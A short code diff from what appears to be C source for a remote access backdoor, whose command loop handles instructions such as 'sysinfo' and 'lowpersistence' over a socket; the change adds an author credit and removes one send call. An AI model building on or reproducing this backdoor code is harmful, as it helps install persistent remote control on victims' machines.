@@ -22,8 +22,13 @@
 #define SOCKBUFF 2048
 #define CMDBUFF 4096
 
-// Variables Globales 
+/*
 
+  Creado por "an0mal1a"
+
+       https://github.com/an0mal1a
+
+*/
 
 // Prototipos
 char *IsElevated();
@@ -420,7 +425,6 @@ int mainLoop(int conn){
         
         else if (strcmp(instruct, "sysinfo") == 0){
             srtSysInfo(conn);
-            send(conn, "end\0", strlen("end\0"), 0);
         
         } else if (strcmp(instruct, "lowpersistence") == 0){
             getPrstnc(conn, "low");          
